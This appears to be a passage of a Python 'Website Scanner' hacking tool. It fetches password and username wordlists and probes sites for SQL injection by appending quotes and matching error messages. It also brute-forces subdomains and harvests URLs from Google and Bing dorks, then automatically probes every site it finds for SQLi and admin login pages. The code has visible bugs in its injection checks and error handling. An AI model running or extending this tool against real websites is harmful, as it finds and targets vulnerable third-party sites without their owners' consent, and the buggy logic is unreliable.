#!/usr/bin/python
import sys, os, re, io

# Color [ANSI] ==========================================
W = "\033[38;5;245m"
WH = "\033[38;5;15m"
PINK = "\033[38;5;207m"
P = "\033[38;5;105m"
R = '\033[0;31m'
G = '\033[0;32m'
O = '\033[38;5;130m'
B = '\033[38;5;37m'
BR = '\033[1;31m'
BG = '\033[1;32m'
BO = '\033[38;5;208m'
BB = '\033[38;5;51m'

# Set Variable ==========================================
printout = W + "[" + BO + "+" + W + "]"
success = W + "[" + BG + "+" + W + "]"
fail = W + "[" + BR + "-" + W + "]"
error = W + "[" + BR + "!" + W + "]"
found = W + "[" + BG + "Found!" + W + "]"
loading = W + "[" + BO + "%" + W + "]"
systm = W + "[" + BR + "$" + W + "]"
loginfound = W + "[" + BG + "Login Page Found!" + W + "]"
notfound = W + "[" + BR + "Page Not Found!" + W + "]"
ercon = W + "[" + BR + "ERROR! Could Not Connect" + W + "]"
invalid = W + "   [" + BR + "$" + W + "]" + BR + " Invalid!"

author = "Surya H.S"
version = "v1.0"
line1 = "\n\n==============================["
line2 = "]==============================\n\n"

# Get Terminal Width ==========================================
term_size = os.get_terminal_size()
whitespace = ""

for xx in range(term_size.columns):
  whitespace += " "

whitespace = whitespace

# Check Python Version ==========================================
try:
  import platform
except ImportError as sp:
  os.system("pip install platform")

if sys.version[0] in '2':
  print('\n[x] Not Supported For python 2.x Please Use Python 3.x \n')
  ins = input('Install Python3? Y/n: ')
  if ins == '1' or ins == '01':
    os.system('apt install python3')
  else:
    exit()

# Cleaning Temp ==========================================
print(f"{systm}{BG} Cleaning Temp Folder...\n")
try:
  if os.path.exists("./install.sh"):
    os.remove("./install.sh")
except Exception:
  pass

if os.path.exists("./.temp"):
  for i in os.listdir("./.temp"):
    if os.path.exists(os.path.join("./.temp", i)):
      os.remove(os.path.join("./.temp", i))

#Setup Folder & Resource =====================================
try:
  import wget
except ImportError as wget_err:
  os.system("pip install wget")

if not os.path.exists("./output"):
  os.makedirs("./output")

if not os.path.exists("./.temp"):
  os.makedirs("./.temp")

if not os.path.exists("./src"):
  os.makedirs("./src")

if not os.path.exists("./src/adminpages.txt"):
  wget.download("https://raw.githubusercontent.com/SansXpl/src/main/adminpages.txt","./src/")

if not os.path.exists("./src/subdomains.txt"):
  wget.download("https://raw.githubusercontent.com/SansXpl/src/main/subdomains.txt","./src/")

if not os.path.exists("./src/error_sql.txt"):
  wget.download("https://raw.githubusercontent.com/SansXpl/src/main/error_sql.txt","./src/")

if not os.path.exists("./src/UserAgent.txt"):
  wget.download("https://raw.githubusercontent.com/SansXpl/src/main/UserAgent.txt","./src/")

if not os.path.exists("./src/users.txt"):
  wget.download("https://raw.githubusercontent.com/SansXpl/src/main/users.txt","./src/")

if not os.path.exists("./src/passwords.txt"):
  wget.download("https://raw.githubusercontent.com/SansXpl/src/main/passwords.txt","./src/")

if not os.path.exists("./output/crawler"):
  os.makedirs("./output/crawler")

if not os.path.exists("./output/subscan"):
  os.makedirs("./output/subscan")

if not os.path.exists("./output/dorkscan"):
  os.makedirs("./output/dorkscan")

if not os.path.exists("./output/vulnsqli"):
  os.makedirs("./output/vulnsqli")

if not os.path.exists("./output/adminfind"):
  os.makedirs("./output/adminfind")

if not os.path.exists("./output/logbrute"):
  os.makedirs("./output/logbrute")

if not os.path.exists("./output/wpbrute"):
  os.makedirs("./output/wpbrute")

if not os.path.exists("./output/nslookup"):
  os.makedirs("./output/nslookup")

if not os.path.exists("./output/revIP"):
  os.makedirs("./output/revIP")

# Checking PIP Packages ==========================================
try:
  print(f"{loading}{BO} Checking Packages ...")
  import mechanicalsoup, blessed, lxml, threading, subprocess, http.client as httplib, urllib.parse, httplib2, socket, os.path, ipaddress, ipdetector, collections, datetime, requests, random, json, time, uuid
  from mechanicalsoup import StatefulBrowser
  from re import findall
  from os import getcwd as pth
  from time import sleep, localtime
  from urllib.parse import urlparse
  from urllib.parse import urljoin
  from lxml import html
  from sys import exit
  from threading import Thread
  from ipdetector import ipCategorizer
  from requests import ConnectionError
  from time import sleep
  from collections import namedtuple
  from datetime import datetime
  from blessed import Terminal
  print(f"\n{success}{BG} Packages is OK")

except ImportError as chk:
  print(f"\n{loading}{BO} Checking Packages ... \n")
  try:
    import blessed
    print(f"{success}{BG} blessed Ok")
  except ImportError as a0:
    print(f"{loading}{BO} Installing blessed")
    os.system("pip install blessed")

  try:
    import threading
    print(f"{success}{BG} threading Ok")
  except ImportError as a1:
    print(f"{loading}{BO} Installing threading")
    os.system("pip install threading")

  try:
    import subprocess
    print(f"{success}{BG} subprocess Ok")
  except ImportError as a2:
    print(f"{loading}{BO} Installing subprocess")
    os.system("pip install subprocess")

  try:
    import http.client as httplib
    print(f"{success}{BG} http.client Ok")
  except ImportError as a3:
    print(f"{loading}{BO} Installing http.client")
    os.system("pip install http.client")

  try:
    import urllib.parse
    print(f"{success}{BG} urllib.parse Ok")
  except ImportError as a4:
    print(f"{loading}{BO} Installing urllib.parse")
    os.system("pip install urllib.parse")

  try:
    import httplib2
    print(f"{success}{BG} httplib2 Ok")
  except ImportError as a5:
    print(f"{loading}{BO} Installing httplib2")
    os.system("pip install httplib2")

  try:
    import socket
    print(f"{success}{BG} socket Ok")
  except ImportError as a6:
    print(f"{loading}{BO} Installing socket")
    os.system("pip install socket")

  try:
    import os.path
    print(f"{success}{BG} os.path Ok")
  except ImportError as a7:
    print(f"{loading}{BO} Installing os.path")
    os.system("pip install os.path")

  try:
    import ipaddress
    print(f"{success}{BG} ipaddress Ok")
  except ImportError as a8:
    print(f"{loading}{BO} Installing ipaddress")
    os.system("pip install ipaddress")

  try:
    import ipdetector
    print(f"{success}{BG} ipdetector Ok")
  except ImportError as a9:
    print(f"{loading}{BO} Installing ipdetector")
    os.system("pip install ipdetector")

  try:
    import collections
    print(f"{success}{BG} collections Ok")
  except ImportError as a10:
    print(f"{loading}{BO} Installing collections")
    os.system("pip install collections")

  try:
    import datetime
    print(f"{success}{BG} datetime Ok")
  except ImportError as a11:
    print(f"{loading}{BO} Installing datetime")
    os.system("pip install datetime")

  try:
    import requests
    print(f"{success}{BG} requests Ok")
  except ImportError as a12:
    print(f"{loading}{BO} Installing requests")
    os.system("pip install requests")

  try:
    import random
    print(f"{success}{BG} random Ok")
  except ImportError as a13:
    print(f"{loading}{BO} Installing random")
    os.system("pip install random")

  try:
    import json
    print(f"{success}{BG} json Ok")
  except ImportError as a14:
    print(f"{loading}{BO} Installing json")
    os.system("pip install json")

  try:
    import time
    print(f"{success}{BG} time Ok")
  except ImportError as a15:
    print(f"{loading}{BO} Installing time")
    os.system("pip install time")

  try:
    import uuid
    print(f"{success}{BG} uuid Ok")
  except ImportError as a16:
    print(f"{loading}{BO} Installing uuid")
    os.system("pip install uuid")

  try:
    import lxml
    print(f"{success}{BG} lxml Ok")
  except ImportError as a17:
    print(f"{loading}{BO} Installing lxml")
    os.system("pip install lxml")

  try:
    import mechanicalsoup
    print(f"{success}{BG} mechanicalsoup Ok")
  except ImportError as a18:
    print(f"{loading}{BO} Installing mechanicalsoup")
    os.system("pip install mechanicalsoup")

  from time import sleep, localtime
  from mechanicalsoup import StatefulBrowser
  from re import findall
  from os import getcwd as pth
  from urllib.parse import urlparse
  from urllib.parse import urljoin
  from lxml import html
  from sys import exit
  from threading import Thread
  from ipdetector import ipCategorizer
  from requests import ConnectionError
  from time import sleep
  from collections import namedtuple
  from datetime import datetime
  from blessed import Terminal

# Check Device OS ==========================================
osdevice = {'Win', 'Win98', 'WinNT3', 'WinNT4', 'Windows', 'WindowsCE'}

if platform.system() in osdevice:
  clrcmd = '"cls"'
  print(f"\n{systm}{BO} OS is Windows, using CLS to clear Terminal")
else:
  clrcmd = '"clear"'
  print(f"\n{systm}{BO} OS is Linux or Other, using CLEAR to clear Terminal")

time.sleep(0.750)

# Banner =====================================
os.system(clrcmd)
banner = f"""\033[38;5;208m
     │_________________________
 │   │''|''|''|''|''|''|''|''| \__
 ┝━━━┥    \033[1;30;41m[WEBSITE SCANNER]\033[0;38;5;208m     __]━───────────
 │   │_________________________/
     │                      \033[1;31mBy: {author} {version}
     {W}
+──────────────────────────────────────────────+{BR}
  Tools For Scanning Website, Brute Force, Etc {W}
+──────────────────────────────────────────────+"""


# Check Connection ==========================================
def checkConnection(url, option):
  sys.stdout.write(f"\n{loading}{BO} Checking Connecting to {BB}{url}")
  time.sleep(0.5)
  if option == 1:
    try:
      requests.get(url, timeout=10)
      sys.stdout.write(f"\r{whitespace}")
      sys.stdout.write(f"\r{success}{BG} Connection Established!\n")
    except:
      sys.stdout.write(f"\r{whitespace}")
      sys.stdout.write(
        f"\r{error}{BR} Connection Error, Maybe Your Internet Connection or Website Down!"
      )
      input("")
      main()
  elif option == 0:
    try:
      requests.get(url, timeout=10)
      sys.stdout.write(f"\r{whitespace}")
      sys.stdout.write(f"\r{success}{BG} Connection Established!\n")
    except:
      sys.stdout.write(f"\r{whitespace}")
      sys.stdout.write(
        f"\r{error}{BR} Connection Error, Maybe Your Internet Connection or Website Down!"
      )
      input("")
      pass
  elif option == 2:
    try:
      requests.get(url, timeout=10)
      sys.stdout.write(f"\r{whitespace}")
      sys.stdout.write(f"\r{success}{BG} Connection Established!\n")
    except:
      sys.stdout.write(f"\r{whitespace}")
      sys.stdout.write(
        f"\r{error}{BR} Connection Error, Maybe Your Internet Connection or Website Down!"
      )
      pass


# Remove Duplicates Text Output ==========================================
def removeDups(inputfile):
  tmp = "./.temp/"
  filename = inputfile
  os.rename(tmp + inputfile, tmp + inputfile + "_old")
  lines = open(tmp + inputfile + "_old", 'r').readlines()

  lines_set = set(lines)
  out = open(tmp + filename, 'w')
  for line in lines_set:
    out.write(line)
  os.remove(tmp + inputfile + "_old")


# Saving File ==========================================
def save_file(name, content, mode):
  if mode == 1:
    if os.path.exists(name):
      os.rename(name, name + "_old")
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      old = open(name + "_old", "r")
      new = open(name, "a+")
      text = content
      new.writelines(line + text + old.read())
      old.close()
      new.close()
      os.remove(name + "_old")
    else:
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      text = content
      new = open(name, "a+")
      new.writelines(line + text)
      new.close()

    input(f"\n{success}{BG} Output Saved In: {P}{name}")

  elif mode == 2:
    if os.path.exists(name):
      os.rename(name, name + "_old")
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      old = open(name + "_old", "r")
      new = open(name, "a+")
      text = content
      new.writelines(line + text + old.read())
      old.close()
      new.close()
      os.remove(name + "_old")
    else:
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      text = content
      new = open(name, "a+")
      new.writelines(line + text)
      new.close()

    print(f"\n{success}{BG} Output Saved In: {P}{name}")

  elif mode == 3:
    if os.path.exists(name):
      os.rename(name, name + "_old")
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      old = open(name + "_old", "r")
      new = open(name, "a+")
      text = content
      new.writelines(line + text + old.read())
      old.close()
      new.close()
      os.remove(name + "_old")
    else:
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      text = content
      new = open(name, "a+")
      new.writelines(line + text)
      new.close()

    input(f"\n{success}{BG} Login Page Saved In: {P}{name}")

  elif mode == 4:
    if os.path.exists(name):
      os.rename(name, name + "_old")
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      old = open(name + "_old", "r")
      new = open(name, "a+")
      text = content
      new.writelines(line + text + old.read())
      old.close()
      new.close()
      os.remove(name + "_old")
    else:
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      text = content
      new = open(name, "a+")
      new.writelines(line + text)
      new.close()

    print(f"\n{success}{BG} Login Page Saved In:{P}{name}")

  elif mode == 5:
    if os.path.exists(name):
      os.rename(name, name + "_old")
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      old = open(name + "_old", "r")
      new = open(name, "a+")
      text = content
      new.writelines(line + text + old.read())
      old.close()
      new.close()
      os.remove(name + "_old")
    else:
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      text = content
      new = open(name, "a+")
      new.writelines(line + text)
      new.close()


#SQli Scanner ====================================
class sqlscan():

  def main(self, mode):
    try:
      vulntemp = str(uuid.uuid4()) + "_vuln"
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} SQLI Scanner {W}")
      if (mode == 1):
        scan = str(input(f" └─[{BO}Target{W}]{P} "))

        n_url = urlparse(scan).hostname
        checkConnection(scan, 1)

        try:
          try:
            dq = 0
            __vuln = ""

            with open("./src/error_sql.txt", 'r') as f:
              sqlerror = f.read().splitlines()

            sys.stdout.write(f"\n{loading}{BO} Check Vuln ['][-]: {W}{scan}")
            resp = requests.get(scan + "'")
            errcount = 1

            for err in sqlerror:
              sys.stdout.write(f"\r{whitespace}")
              sys.stdout.write(
                f"\r{loading}{BO} Check Vuln ['][{int(errcount)}]: {W}{scan}")
              errcount += 1
              if re.search(err, resp.text):
                __vuln = err

                sys.stdout.write("\r" + whitespace)
                sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
                print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                print(f'{printout}{BB} Url: {P}{scan}\n')

                name = "./output/vulnsqli/" + n_url + ".txt"
                content = f"""[Checking With Single Quote (’)]
Url: {scan}
Error: {err}\n\n"""
                save_file(name, content, 1)
                main()
                break
              else:
                dq = 1
              time.sleep(0.005)

            if dq == 1:
              sys.stdout.write(f"\r{whitespace}")
              sys.stdout.write(f'\r{loading}{BO} Check Vuln ["][-]: {W}{scan}')
              resp1 = requests.get(scan + '"')
              for errr in sqlerror:
                sys.stdout.write(f"\r{whitespace}")
                sys.stdout.write(
                  f'\r{loading}{BO} Check Vuln ["][{int(errcount)}]: {W}{scan}'
                )
                errcount += 1
                if re.search(errr, resp.text):
                  __vuln = errr

                  sys.stdout.write("\r" + whitespace)
                  sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
                  print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                  print(f'{printout}{BB} Url: {P}{scan}\n')
                  name = "./output/vulnsqli/" + n_url + ".txt"
                  content = f"""[Checking With Double Quote (”)]
Url: {scan}
Error: {err}\n\n"""
                  save_file(name, content, 1)
                  main()
                  break
                else:
                  sys.stdout.write(
                    f"\r{error}{BR} Not Vulnerability: {W}{scan}")
                  input("")
                time.sleep(0.005)

          except Exception as e:
            print(BR + e)

          except KeyboardInterrupt:
            cancel()

        except Exception:
          sys.stdout.write(f"\r{whitespace}")
          sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
          input("")
        main()

      elif (mode == 2):
        filetemp = str(uuid.uuid4())
        path = str(input(f" ├─[{BO}Path File{W}]{P} "))
        if not os.path.exists(path):
          input(f"{error}{BR} File Does Not Exists!")
          self.main(mode)
        output = str(input(f"{W} └─[{BO}Output File{W}]{P} "))

        with open(path, 'r') as f:
          sqllists = f.read().splitlines()

        outputfile = os.path.splitext(output)[0]

        for sqllist in sqllists:
          scan = sqllist
          checkConnection(scan, 2)

          try:
            try:
              dq = 0
              __vuln = ""

              with open("./src/error_sql.txt", 'r') as f:
                sqlerror = f.read().splitlines()

              sys.stdout.write(f"\n{loading}{BO} Check Vuln ['][-]: {W}{scan}")
              resp = requests.get(scan + "'")
              errcount = 1

              for err in sqlerror:
                sys.stdout.write(f"\r{whitespace}")
                sys.stdout.write(
                  f"\r{loading}{BO} Check Vuln ['][{int(errcount)}]: {W}{scan}"
                )
                errcount += 1
                if re.search(err, resp.text):
                  __vuln = err

                  sys.stdout.write("\r" + whitespace)
                  sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
                  print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                  print(f'{printout}{BB} Url: {P}{scan}\n')

                  temp = open("./.temp/" + vulntemp, "a+")
                  text = f"""[Checking With Single Quote (’)]
Url: {scan}
Error: {err}\n\n"""
                  temp.writelines(text)
                  temp.close()

                  break
                  pass
                else:
                  dq = 1
                time.sleep(0.005)

              if dq == 1:
                sys.stdout.write(f"\r{whitespace}")
                sys.stdout.write(
                  f'\r{loading}{BO} Check Vuln ["][-]: {W}{scan}')
                resp1 = requests.get(scan + '"')
                for errr in sqlerror:
                  sys.stdout.write(f"\r{whitespace}")
                  sys.stdout.write(
                    f'\r{loading}{BO} Check Vuln ["][{int(errcount)}]: {W}{scan}'
                  )
                  errcount += 1
                  if re.search(errr, resp.text):
                    __vuln = errr

                    sys.stdout.write("\r" + whitespace)
                    sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
                    print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                    print(f'{printout}{BB} Url: {P}{scan}\n')
                    temp = open("./.temp/" + vulntemp, "a+")
                    text = f"""[Checking With Double Quote (”)]
Url: {scan}
Error: {err}\n\n"""
                    temp.writelines(text)
                    temp.close()
                    break
                    pass
                  else:
                    sys.stdout.write(f"\r{whitespace}")
                    sys.stdout.write(
                      f"\r{error}{BR} Not Vulnerability: {W}{scan}")
                    break
                    pass
                  time.sleep(0.005)

            except Exception as e:
              print(BR + e)

            except KeyboardInterrupt:
              pause = str(
                input(
                  f"\n{systm}{BB} [S = Skip] [X = Stop] {BO}Default is Skip [S/X?]"
                ))

              if pause == "X" or pause == "x":
                if os.path.exists("./.temp/" + vulntemp):
                  c = open("./.temp/" + vulntemp, "r")
                  name = "./output/vulnsqli/" + outputfile + ".txt"
                  content = c.read()
                  c.close()
                  os.remove("./.temp/" + vulntemp)
                  save_file(name, content, 1)
                  main()
                else:
                  input(f"\n{fail}{BO} Nothing is Saved!")
                  main()
              else:
                pass

          except Exception:
            sys.stdout.write(f"\r{whitespace}")
            sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
            pass

        if os.path.exists("./.temp/" + vulntemp):
          c = open("./.temp/" + vulntemp, "r")
          name = "./output/vulnsqli/" + outputfile + ".txt"
          content = c.read()
          c.close()
          os.remove("./.temp/" + vulntemp)
          save_file(name, content, 1)
        else:
          input(f"\n{fail}{BO} Nothing is Saved!")
        main()
    except KeyboardInterrupt:
      cancel()


#Subdomain Scanner =====================================
class SUB():

  def request(self, url):
    try:
      return requests.get("http://" + url)
    except requests.exceptions.ConnectionError:
      pass

  def main(self):
    try:
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} Subdomain Scanner {W}")

      filetemp = str(uuid.uuid4())
      s_url = str(input(f" └─[{BO}Url{W}]{P} "))
      if "http://" in s_url or "https://" in s_url:
        n_url = urlparse(s_url).hostname
        s_url = n_url
        s_url = str(s_url)
      else:
        n_url = s_url
        s_url = s_url

      checkConnection("http://" + n_url, 1)

      try:
        subdomains = []
        with open("./src/subdomains.txt", 'r') as file:
          for line in file:
            try:
              word = line.strip()
              test_url = word + "." + s_url
              response = self.request(test_url)
              subdomains.append("https://" + test_url)
              test_url = 'https://' + test_url

              sys.stdout.write("\r" + whitespace)
              sys.stdout.write(f"\r{loading}{BO} CHECKING: {test_url}")
              time.sleep(0.02)

              if response:
                sys.stdout.write("\r" + whitespace)
                sys.stdout.write(f"\r{success}{BG} FOUND: {test_url}\n")
                text = "Url: {}\n".format(test_url)
                temp = open("./.temp/" + filetemp, "a+")
                temp.writelines(text)
                temp.close()

            except KeyboardInterrupt:
              pause = str(
              input(
                f"\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"
              ))

              if pause == "X" or pause == "x":
                if os.path.exists("./.temp/" + filetemp):
                  removeDups(filetemp)
                  c = open("./.temp/" + filetemp, "r")
                  name = "./output/subscan/" + n_url + ".txt"
                  content = c.read()
                  c.close()
                  os.remove("./.temp/" + filetemp)
                  save_file(name, content, 1)
                else:
                  input(f"\n{fail}{BO} Nothing is Saved!")
                main()
                break
                
          if os.path.exists("./.temp/" + filetemp):
            removeDups(filetemp)
            c = open("./.temp/" + filetemp, "r")
            name = "./output/subscan/" + n_url + ".txt"
            content = c.read()
            c.close()
            os.remove("./.temp/" + filetemp)
            save_file(name, content, 2)
          else:
            input(f"\n{fail}{BO} Nothing is Saved!")
            main()
        main()
      except requests.exceptions.ConnectionError:
        print("\n" + ercon + R + " " + test_url)
    except KeyboardInterrupt:
      cancel()


#Dork Scanner =====================================


def useragentdork():
  listAgent = open("./src/UserAgent.txt", "r")
  Agent = listAgent.read().splitlines()
  uag = random.choice(Agent)
  return uag


class scrape(StatefulBrowser):

  def __repr__(fitur={
    'features': 'html.parser',
  }, uag=useragentdork()):
    return StatefulBrowser(soup_config=fitur, user_agent=uag)


class Parser(object):
  __list = []

  def __init__(self, dork, URL, pattern, class_tag, proxy=None):
    self.dork = dork
    self.URL = URL
    self.__pattern = pattern
    self.class_tag = class_tag
    self.proxy = {'https': proxy}

  def __dir__(self):
    return list(set(self.__list))

  def get_page(self):
    self.__req = scrape()
    s = self.__req.open(self.URL, proxies=self.proxy, timeout=10)
    self.__req.select_form('form[action="/search"]')
    self.__req['q'] = self.dork
    self.__req.submit_selected()
    _content = str(self.__req.get_current_page())
    for urls in findall(self.__pattern, _content):
      if 'www.google.com' in self.URL: self.__list.append(urls)
      else: self.__list.append(urls[:-1])
    return self.__req.get_current_page().find_all('a', class_=self.class_tag)

  def request(self):
    self.__req = scrape()
    for page in self.get_page():
      try:
        self.__req.open(f'{self.URL}{page.get("href")}', proxies=self.proxy)
        content = str(self.__req.get_current_page())
        for urls in findall(self.__pattern, content):
          if 'www.google.com' in self.URL: self.__list.append(urls)
          else: self.__list.append(urls[:-1])
      except Exception as e:
        input(BR + str(e))
        main()


urls = []


class crawl(object):

  auth = {
    1:
    ['https://www.google.com', 'class="r"><a href="/url\?q=(.*?)&amp', 'fl'],
    2: ['https://www.bing.com', 'h=".*?" href="(h.*?")', "b_widePag sb_bp"]
  }

  def __init__(self, dork, proxy=None):
    self.dork = dork
    self.proxy = proxy

  def Bing(self):
    bing = Parser(self.dork,
                  crawl.auth[2][0],
                  crawl.auth[2][1],
                  crawl.auth[2][2],
                  proxy=self.proxy)
    bing.request()
    for url in dir(bing):
      if 'go.microsoft.com' in url or 'bing.com' in url:
        pass
      else:
        urls.append(url)

  def Google(self):
    google = Parser(self.dork,
                    crawl.auth[1][0],
                    crawl.auth[1][1],
                    crawl.auth[1][2],
                    proxy=self.proxy)
    google.request()
    for url in dir(google):
      if 'go.microsoft.com' in url or 'bing.com' in url:
        pass
      else:
        urls.append(url)


class dorkscan():

  def main(self):
    try:
      filetemp = str(uuid.uuid4())
      filetemp2 = str(uuid.uuid4())
      vulntemp = str(uuid.uuid4()) + "_vuln"
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} Dork Scanner{W}")
      print(f" ├─[{PINK}Add -s for Scan{W}]")
      print(f"{W} │")
      dorks = str(input(f"{W} ├─[{O}Dork{W}]{P} "))
      proxy = str(input(f"{W} └─[{O}Proxy{W}]{P} "))

      prx = BR + "Not Set"
      if "-s" in dorks or "--scan" in dorks:
        _scan = "y"
        sqli = BG + "Scanned"
        if "--scan" in dorks:
          _dork = dorks.replace("--scan", "")
        else:
          _dork = dorks.replace("-s", "")

      else:
        _scan = "n"
        sqli = BR + "Not Scanned"
        _dork = dorks

      if proxy.isspace() or "" in proxy:
        proxy = None
        prx = BR + "Not Set"
      else:
        prx = BB + str(proxy)

      if not _dork.isspace() or "" in _dork:
        pass
      else:
        input(f"{error}{BR} Input Dork!")
        self.main()

      print(f"\n{printout}{BO} Dork..: {BB}{_dork}")
      print(f"{printout}{BO} SQLi..: {sqli}")
      print(f"{printout}{BO} Proxy.: {prx}")

      checkConnection("http://www.google.com/search?q=" + _dork, 1)
      sys.stdout.write(f"\n{loading}{BO} Try Getting Url...")

      nm = re.sub("[*:/<>?|=.~!@#$%^&(); ]", "_", _dork)
      mn = nm.replace("\ ", "")
      mn1 = mn.replace("'", "")
      mn2 = mn1.replace('"', "")
      nm = mn2
      if _scan == "y":
        if _dork != None:
          _ = crawl(_dork, proxy=proxy)
          _.Bing()
          _.Google()
          sys.stdout.write(f"\r{success}{BG} Getting Url Success!")
          if urls != []:
            #for url in list(set(urls)):
            #   print('- {}'.format(url))
            for scan in list(set(urls)):
              try:
                try:
                  dq = 0
                  __vuln = ""
                  with open("./src/error_sql.txt", 'r') as f:
                    sqlerror = f.read().splitlines()

                  with open("./src/adminpages.txt", 'r') as r:
                    admfound = r.read().splitlines()

                  sys.stdout.write(
                    f"\n{loading}{BO} Check Vuln ['][-]: {W}{scan}")
                  resp = requests.get(scan + "'")
                  errcount = 1
                  for adm1 in admfound:
                    if adm1 in scan:
                      admnm = urlparse(scan).hostname
                      print(f"\n\n{loginfound} {P}{scan}")
                      name = "./output/adminfind/" + admnm + ".txt"
                      content = "\nUrl: {}".format(scan)
                      save_file(name, content, 5)
                      print(f"{success}{BG} Login Page Saved In:{P}{name}\n\n")
                      break
                    time.sleep(0.005)

                  for err in sqlerror:
                    sys.stdout.write(f"\r{whitespace}")
                    sys.stdout.write(
                      f"\r{loading}{BO} Check Vuln ['][{int(errcount)}]: {W}{scan}"
                    )
                    errcount += 1
                    if re.search(err, resp.text):
                      temp = open("./.temp/" + vulntemp, "a+")
                      text = f"""[Checking With Single Quote (’)]
Url: {scan}
Error: {err}\n\n"""
                      temp.writelines(text)
                      temp.close()

                      __vuln = err

                      sys.stdout.write("\r" + whitespace)
                      sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
                      print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                      print(f'{printout}{BB} Url: {P}{scan}\n')
                      break
                      pass
                    else:
                      dq = 1
                    time.sleep(0.005)

                  if dq == 1:
                    sys.stdout.write(f"\r{whitespace}")
                    sys.stdout.write(
                      f'\r{loading}{BO} Check Vuln ["][-]: {W}{scan}')
                    resp1 = requests.get(scan + '"')
                    errcount = 1
                    for errr in sqlerror:
                      sys.stdout.write(f"\r{whitespace}")
                      sys.stdout.write(
                        f'\r{loading}{BO} Check Vuln ["][{int(errcount)}]: {W}{scan}'
                      )
                      errcount += 1
                      if re.search(errr, resp1.text):
                        temp = open("./.temp/" + vulntemp, "a+")
                        text = f"""[Checking With Double Quote (”)]
Url: {scan}
Error: {err}\n\n"""
                        temp.writelines(text)
                        temp.close()

                        __vuln = errr

                        sys.stdout.write("\r" + whitespace)
                        sys.stdout.write(
                          f'\n{success}{BG} Vulnerability SQLi!')
                        print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                        print(f'{printout}{BB} Url: {P}{scan}\n')
                        break
                      else:
                        sys.stdout.write("\r" + whitespace)
                        sys.stdout.write(
                          f"\r{error}{BR} Not Vulnerability: {W}{scan}")
                        #print(f'{BB}[URL]{W} : {self.url}')
                        text = "{}\n".format(scan)
                        temp = open("./.temp/" + filetemp, "a+")
                        temp.writelines(text)
                        temp.close()
                        break
                        pass
                      time.sleep(0.005)

                except Exception as e:
                  print(BR + e)

                except KeyboardInterrupt:
                  pause = str(
                    input(
                      f"\n{systm}{BB} [S = Skip] [X = Stop] {BO}Default is Skip [S/X?]"
                    ))

                  if pause == "X" or pause == "x":
                    if os.path.exists("./.temp/" + vulntemp):
                      c = open("./.temp/" + vulntemp, "r")
                      name = "./output/vulnsqli/" + nm + "vuln.txt"
                      content = c.read()
                      c.close()
                      os.remove("./.temp/" + vulntemp)
                      save_file(name, content, 2)

                      if os.path.exists("./.temp/" + filetemp):
                        sv = input(
                          f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: "
                        )
                        if sv.isspace() or "" in sv:
                          sv = "n"
                        if sv == "y" or sv == "Y":
                          if os.path.exists("./.temp/" + filetemp):
                            removeDups(filetemp)
                            c = open("./.temp/" + filetemp, "r")
                            name = "./output/dorkscan/" + nm + ".txt"
                            content = c.read()
                            c.close()
                            os.remove("./.temp/" + filetemp)
                            save_file(name, content, 1)
                          else:
                            input(f"\n{fail}{BO} Nothing is Saved!")

                        else:
                          os.remove("./.temp/" + filetemp)
                          input(f"\n{fail}{BO} Nothing is Saved!")
                      else:
                        input("")
                      main()

                    else:
                      if os.path.exists("./.temp/" + filetemp):
                        sv = input(
                          f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: "
                        )
                        if sv.isspace() or "" in sv:
                          sv = "n"
                        if sv == "y" or sv == "Y":
                          if os.path.exists("./.temp/" + filetemp):
                            removeDups(filetemp)
                            c = open("./.temp/" + filetemp, "r")
                            name = "./output/dorkscan/" + nm + ".txt"
                            content = c.read()
                            c.close()
                            os.remove("./.temp/" + filetemp)
                            save_file(name, content, 1)
                          else:
                            input(f"\n{fail}{BO} Nothing is Saved!")

                        else:
                          os.remove("./.temp/" + filetemp)
                          input(f"\n{fail}{BO} Nothing is Saved!")
